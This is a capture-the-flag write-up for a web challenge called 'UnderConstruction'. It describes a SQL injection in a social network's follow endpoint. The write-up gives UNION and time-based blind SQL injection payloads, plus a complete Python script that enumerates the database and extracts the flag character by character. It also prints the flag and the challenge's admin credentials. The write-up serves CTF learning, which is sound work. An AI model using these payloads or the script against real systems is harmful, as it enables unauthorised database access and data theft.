# UnderConstruction

I am building a manga-inspired social network and the back-end works perfectly fine! The front-end though... I am not that great at it, but at least I think it looks okay.

Can you check it and see if you'd like to see any other features?
http://chall2.ctf.k1nd4sus.it 

## Writeup

By following all api requests that the application perform, I found a strange thing in the **/api/profile/follow** endpoint.

If we send a follow request to the same user, it will return a **MySQL Integrity Error**:

```html
<title>mysql.connector.errors.IntegrityError: 1062 (23000): Duplicate entry &#39;633099735-1&#39; for key &#39;PRIMARY&#39;
 // Werkzeug Debugger</title>
```

So this means that there is a **SQL injection** vulnerability in the **id param** of this request.

We can use it in order to exfiltrate some data, like how many columns is composed the **user** table:

```json
{"id":"0 UNION SELECT 1,2,3,4,5,6,7,8 -- "}
```

From the response we can find that there are **8 columns** in the user table.

With this query we can find the length of the admin password (user with id 1) using a **Time-Based Blind SQL injection**:

```json
{"id":"1 AND (SELECT SLEEP(10) FROM users WHERE id = 1 and password LIKE '_____')"}
```

By performing some tries, we can find the **admin** credentials:

```
username: admin
email: admin
password: admin
```

But we can't login with the **admin** account, so we need to enumerate better the database.

There is a table named **flag** in the **underconstruction** database:

```python
payload = f"1 AND (SELECT SLEEP(5) FROM information_schema.tables WHERE table_schema = 'underconstruction' and table_name like 'fla{w}%')"
```

Inside the **flag** table there is the **flag** cloumn, so we can exfiltrate the flag with this following exploit:

```python
#!/usr/bin/python3
import requests
from pprint import pprint
import string

ip = 'chall2.ctf.k1nd4sus.it'
port = 80

url = f"http://{ip}:{port}"

wait_time = 5

def register(s, username, email, password):
    data = {
        'username': username,
        'email': email,
        'password': password
    }
    req = s.post(url + '/api/register', json=data)
    return req.content

def login(s, email, password):
    data = {
        'email': email,
        'password': password
    }
    req = s.post(url + '/api/login', json=data)
    return req.content

def follow(s, id):
    data = {
        'id': id
    }
    req = s.post(url + '/api/profile/follow', json=data)
    #print(req.text)
    if req.elapsed.total_seconds() > wait_time:
        return True
    return False

def profile(s):
    req = s.get(url + '/api/profile')
    return req.json()['data']

def popular_posts(s):
    req = s.get(url + '/api/posts/popular')
    return req.json()['data']

def new_posts(s):
    req = s.get(url + '/api/posts/new')
    return req.json()['data']

def upload_css(s, identifier, css):
    data = {
        'id': identifier,
        'css': css,
    }
    req = s.post(url + '/api/profile/css', json=data)
    return req.content

def user_info(s, identifier):
    data = {
        'id': identifier
    }
    req = s.get(url + '/api/chats/user?', params=data)
    return req.content

def user_messages(s, identifier):
    data = {
        'id': identifier
    }
    req = s.get(url + '/api/chats/messages?', params=data)
    return req.json()

if __name__ == '__main__':
    s = requests.session()

    user = 'contr0l'
    email = 'contr0l@team.com'
    pw = 'acdcdcdc232323dddd'

    register(s, user, email, pw)
    login(s, email, pw)
    #for post in new_posts(s):
        #if post['poster']['username'] == 'admin':
            #pprint(post)
    
    #identifier = profile(s)['id']
    #pprint(upload_css(s, identifier, 'ciao'))

    #pprint(user_messages(s, 1))

    wordlist = string.printable.replace('%', '').replace('%', '')

    flag = ''

    print("[*] Wordlist: " + wordlist)

    while True:
        for w in wordlist:
            #payload = f"1 AND (SELECT SLEEP(5) FROM information_schema.columns WHERE table_name = 'messages' and column_name like 'm{w}%')"
            #payload = f"1 AND (SELECT SLEEP(5) FROM users WHERE username like '%KSU%')"
            #payload = f"1 AND (SELECT SLEEP(5) FROM information_schema.tables WHERE table_schema = 'underconstruction' and table_name like 'fla{w}%')"
            #payload = f"1 AND (SELECT SLEEP(5) FROM DUAL WHERE DATABASE() like 'underconstructio{w}%')"
            #payload = f"1 AND (SELECT SLEEP(5) FROM information_schema.columns WHERE table_name = 'flag' and column_name like 'fla{w}%')"
            payload = "1 AND (SELECT SLEEP(5) FROM flag WHERE flag like binary 'KSUS{" + flag + w + "%')"

            if follow(s, payload):
                print(w, end='', flush=True)
                flag += w
                break
        else:
            break

    flag = flag[0:-1]
    print("\n[*] Flag: KSUS{" + flag + "}")
```

The flag is:

```
KSUS{this_is_not_exactly_a_filter_is_it_f83hD32Dkc3hNEey}
```